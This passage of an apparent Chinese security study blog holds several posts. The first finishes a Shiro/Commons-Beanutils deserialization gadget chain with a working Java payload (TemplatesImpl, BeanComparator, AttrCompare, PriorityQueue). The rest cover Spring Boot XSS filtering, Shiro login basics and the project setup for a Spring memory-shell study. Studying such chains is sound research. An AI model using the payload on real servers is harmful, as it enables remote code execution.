<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321143749765.png" alt="image-20220321143749765"></p>
<p>试一下能不能调用,要注意大小写,get方法采用的是驼峰命名方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        </span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p>在<code>BeanComparator</code>中的<code>compare</code>方法中有调用getProperty</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321144513243.png" alt="image-20220321144513243"></p>
<p>从这里开始就和CC2前半部分一样了,通过<code>PriorityQueue</code>类的<code>readObject</code>会调用到<code>compare</code>方法,</p>
<p>但是BeanComparator有个问题</p>
<blockquote>
<p>意外发现</p>
</blockquote>
<p>但是我在偶然的尝试中发现初始化的时候传入<code>Beancomparator</code>,只需要在反射之后再次设置<code>comparator</code>参数为<code>beanComparator</code>,还是能继续触发,但是这个时候队列add的时候需要第二个是templates,而不是第一个是templates,完事自己探究一下</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321225636931.png" alt="image-20220321225636931"></p>
<p>因为Integer里面没有<code>getOutputProperties</code>方法,所以会报错,在初始化优先队列的时候传入一个之前CC2中用的<code>transformingComparator</code>,,等到add完成之后再通过反射修改<code>comparator</code>参数为<code>beanComparator</code></p>
<p>这里就有一个比较重要的思想,就是本地构造类的时候包和目标机器不一致是可以的,只要保证序列化进去的时候修改掉就行</p>
<p>payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator beanComparator = <span class="keyword">new</span> BeanComparator(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        Class&lt;? extends PriorityQueue&gt; priorityQueueClass = priorityQueue.getClass();</span><br><span class="line">        Field declaredField = priorityQueueClass.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        declaredField.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br></pre></td></tr></table></figure>

<p>加密编码后尝试,发现服务端报了这样一个错误,为什么Commons-utils会去加载CC里面的类呢</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321231216837.png" alt="image-20220321231216837"></p>
<p>原因是BeanComparator方法的初始化方法调用了<code>ComparableComparator.getInstance()</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321231636548.png" alt="image-20220321231636548"></p>
<p>不过它还有另一个构造方法,可以自己传入一个满足要求的<code>Comparator</code>,这个Comparator需要满足两点:1.在shiro默认依赖中或者jdk中存在2.由于需要反序列化,所以需要继承<code>Serializeable</code>接口还有<code>Comparator</code>接口</p>
<p>做一个脚本,先通过idea找到继承了接口的类,然后复制黏贴到txt文件中(先把依赖整对,别把别的依赖里面的类搞进去了)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">with <span class="title">open</span> <span class="params">(r<span class="string">&quot;C:\Users\MSI\Desktop\test\Serializeable.txt&quot;</span>)</span> as f:</span></span><br><span class="line"><span class="function">    data</span>=f.readline()</span><br><span class="line">    sers=[]</span><br><span class="line">    <span class="keyword">while</span> data:</span><br><span class="line">        sers.append(data)</span><br><span class="line">        data=f.readline()</span><br><span class="line"><span class="function">with <span class="title">open</span> <span class="params">(r<span class="string">&quot;C:\Users\MSI\Desktop\test\Comparator.txt&quot;</span>)</span> as c:</span></span><br><span class="line"><span class="function">    data</span>=c.readline()</span><br><span class="line">    coms=[]</span><br><span class="line">    <span class="keyword">while</span> data:</span><br><span class="line">        coms.append(data)</span><br><span class="line">        data=c.readline()</span><br><span class="line"><span class="keyword">for</span> i in sers:</span><br><span class="line">    <span class="keyword">if</span>(i in coms):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321234935305.png" alt="image-20220321234935305"></p>
<p>找到了如上这些满足条件的类,第一个<code>AttrCompare</code>就很好用,它只有默认的无参构造方法</p>
<p>尝试后成功</p>
<h5 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator beanComparator = <span class="keyword">new</span> BeanComparator(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> AttrCompare());</span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        Class&lt;? extends PriorityQueue&gt; priorityQueueClass = priorityQueue.getClass();</span><br><span class="line">        Field declaredField = priorityQueueClass.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        declaredField.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>java</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot防御xss的方法学习记录</title>
    <url>/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>大多数流程是:</p>
<ol>
<li>拦截请求</li>
<li>重新包装请求</li>
<li>重写<strong>HttpServletRequest</strong>中的获取参数的方法</li>
<li>将获得的参数进行XSS处理</li>
<li>拦截器放行</li>
</ol>
<p>可以重写Filter的将request中的请求参数进行html实体编码</p>
<h3 id="主要使用的方法HtmlUtils-htmlEscape"><a href="#主要使用的方法HtmlUtils-htmlEscape" class="headerlink" title="主要使用的方法HtmlUtils.htmlEscape"></a>主要使用的方法HtmlUtils.htmlEscape</h3><p>该方法可以将字符串中的一些特殊字符进行转义,进行转义处理后再存入数据库,这样前端请求之后获取到的字符串中可能会导致xss的特殊字符都会转义成html实体编码</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220901174343546.png" alt="image-20220901174343546"></p>
<h3 id="mica-xss"><a href="#mica-xss" class="headerlink" title="mica-xss"></a><a href="https://gitee.com/596392912/mica/tree/master/mica-xss">mica-xss</a></h3><p>有一个特别好用的插件,<code>mica-xss</code></p>
<h5 id="对应springboot版本信息"><a href="#对应springboot版本信息" class="headerlink" title="对应springboot版本信息"></a>对应springboot版本信息</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220831191455575.png" alt="image-20220831191455575"></p>
<p>使用起来也及其简单,只需要两步</p>
<h5 id="1-导入依赖"><a href="#1-导入依赖" class="headerlink" title="1.导入依赖"></a>1.导入依赖</h5><p>由于我这里使用的springBoot版本为2.5.7,所以导入2.5.8版本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.dreamlu<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mica-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.dreamlu<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mica-xss<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h5><p>导入依赖之后就已经可以运行了,可以在配置文件中进行一些简单的设置</p>
<table>
<thead>
<tr>
<th>配置项</th>
<th>默认值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>mica.xss.enabled</td>
<td>true</td>
<td>开启xss</td>
</tr>
<tr>
<td>mica.xss.trim-text</td>
<td>true</td>
<td>【全局】是否去除文本首尾空格</td>
</tr>
<tr>
<td>mica.xss.mode</td>
<td>clear</td>
<td>模式：clear 清理（默认）、escape 转义、validate 校验（3.7.4新增）</td>
</tr>
<tr>
<td>mica.xss.pretty-print</td>
<td>false</td>
<td><code>clear 专用</code> prettyPrint，默认关闭： 保留换行</td>
</tr>
<tr>
<td>mica.xss.enable-escape</td>
<td>false</td>
<td><code>clear 专用</code> 转义，默认关闭</td>
</tr>
<tr>
<td>mica.xss.path-patterns</td>
<td><code>/**</code></td>
<td>拦截的路由，例如: <code>/api/order/**</code></td>
</tr>
<tr>
<td>mica.xss.path-exclude-patterns</td>
<td></td>
<td>放行的路由，默认为空</td>
</tr>
</tbody></table>
<p>同时也提供了对应的可以自定义过滤规则的方式</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>xss</tag>
        <tag>springBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro简单学习记录</title>
    <url>/2022/09/27/shiro%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>先来一个简单的登录认证小例子</p>
<p>编一个ini文件模拟数据库中获取的数据</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220927171547699.png" alt="image-20220927171547699"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.config.IniSecurityManagerFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.mgt.SecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroRun</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.初始化获取SecurityManager</span></span><br><span class="line">        IniSecurityManagerFactory factory =<span class="keyword">new</span> IniSecurityManagerFactory(<span class="string">&quot;classpath:shiro.ini&quot;</span>);</span><br><span class="line">        SecurityManager securityManager=factory.getInstance();</span><br><span class="line">        SecurityUtils.setSecurityManager(securityManager);</span><br><span class="line">        <span class="comment">//2.获取subject对象</span></span><br><span class="line">        Subject subject=SecurityUtils.getSubject();</span><br><span class="line">        <span class="comment">//3.创建token对象,web应用用户名密码从页面传递</span></span><br><span class="line">        AuthenticationToken token=<span class="keyword">new</span> UsernamePasswordToken(<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="comment">//4.完成登录</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">            System.out.println(<span class="string">&quot;登录成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AuthenticationException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//异常还有很多种,这里笼统的写一个就行了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="授权概念"><a href="#授权概念" class="headerlink" title="授权概念"></a>授权概念</h3><p>1.授权,也叫访问控制,即在应用中控制谁访问哪些资源(如访问页面/编辑数据/页面操作等).在授权中需了解的几个关键对象:主体(subject),资源(Resource),权限(permission),角色(role)</p>
<p>2.主体(Subject):访问应用的用户,在Shiro中使用subject代表该用户,用户只有授权后才能访问相应的资源</p>
<p>3.资源(Resource):在应用中用户可以访问的URL,比如访问JSP页面,查看/编辑某些数据,访问某个业务方法,打印文本等等都是资源,用户需要授权后才能访问</p>
<p>3.权限(permission):安全策略中的原子授权单位,通过权限我们可以表示在应用中用户有没有操作某个资源的权利,即权限表示在应用中用户能不能访问某个资源,如:访问用户列表页面查看/新增/修改/删除用户数据(即很多时候都是CRUD)增删改查式权限控制等</p>
<p>5.shiro支持粗粒度权限(如用户模块的所有权限)和细粒度权限(操作某个用户的权限,即实例级别的)</p>
<p>6.角色(role):权限的集合,一般情况下会赋予用户角色而不是权限,即这样用户可以拥有一组权限,赋予权限时比较方便,典型的如:项目经理,技术总监,CTO,开发工程师等都是角色,不同的角色拥有一组不同的权限</p>
<h4 id="授权方式"><a href="#授权方式" class="headerlink" title="授权方式"></a>授权方式</h4><h5 id="1-编程方式"><a href="#1-编程方式" class="headerlink" title="1.编程方式"></a>1.编程方式</h5><p>通过写if/else授权代码块完成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(subject.hasRole(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">    <span class="comment">//有权限</span></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//无权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-注解式"><a href="#2-注解式" class="headerlink" title="2.注解式"></a>2.注解式</h5><p>通过在执行的java方法上防止相应的注解完成,没有权限将抛出相应的已换成那个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequireRoles(&quot;admin&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-JSP-GSP标签"><a href="#3-JSP-GSP标签" class="headerlink" title="3.JSP/GSP标签"></a>3.JSP/GSP标签</h5><p>在jsp/gsp页面通过相应的标签完成</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;shiro:hasRole name=<span class="string">&quot;admin&quot;</span>&gt;</span><br><span class="line">    有权限</span><br><span class="line">&lt;/shiro:hasRole&gt;</span><br></pre></td></tr></table></figure>

<h4 id="授权流程"><a href="#授权流程" class="headerlink" title="授权流程"></a>授权流程</h4><p>subject.isPermitted/hasRole</p>
<h3 id="自定义登录认证"><a href="#自定义登录认证" class="headerlink" title="自定义登录认证"></a>自定义登录认证</h3><h3 id="与SpringBoot整合"><a href="#与SpringBoot整合" class="headerlink" title="与SpringBoot整合"></a>与SpringBoot整合</h3><p>3.1框架整合</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>spring内存马学习</title>
    <url>/2022/04/21/spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Controller内存马"><a href="#Controller内存马" class="headerlink" title="Controller内存马"></a>Controller内存马</h2><p>要学习内存马先得配好环境,之前学的创建springMVC项目的步骤已经忘完了…..,再复习一下</p>
<p>首先从maven目标中创建一个webapp项目</p>
<p>然后开始导入相关依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--spring核心--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--servlet核心--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--jsp核心--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--文件上传依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.58<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>springBoot用过之后觉得这配置好麻烦……</p>
<p>接着创建resources目录配置spring和springMVC的配置文件</p>
<p>大体目录结构</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422002418321.png" alt="image-20220422002418321"></p>
<p>配置文件自定义,右键new选择spring Config</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422002516259.png" alt="image-20220422002516259" style="zoom:80%;" />

<p>spring配置文件,命名自定义,后面在web.xml中写对应就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">        &quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Spring配置文件：除了控制器之外的bean对象都在这被扫描 --&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.test.service&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>springMVC配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">        http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd</span><br><span class="line">        &quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- SpringMVC配置文件：控制器的bean对象在这被扫描 --&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.test.controller&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--    启动mvc的注解--&gt;</span><br><span class="line">    &lt;mvc:annotation-driven/&gt;</span><br><span class="line">    &lt;!--    配置视图解析器的配置--&gt;                                  &lt;!--    调用视图解析器的方法：InternalResourceViewResolver--&gt;</span><br><span class="line">    &lt;bean id=&quot;internalResourceViewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</span><br><span class="line">        &lt;!-- 前缀 --&gt;</span><br><span class="line">        &lt;property name=&quot;prefix&quot; value=&quot;/&quot;/&gt;&lt;!--默认访问路径是webapp根路径下的，如果webapp下还有其他文件夹就写:/webapp/文件夹名--&gt;</span><br><span class="line">        &lt;!-- 后缀 --&gt;</span><br><span class="line">        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;&lt;!-- 如果是index.html文件，就写html --&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后,web.xml</p>
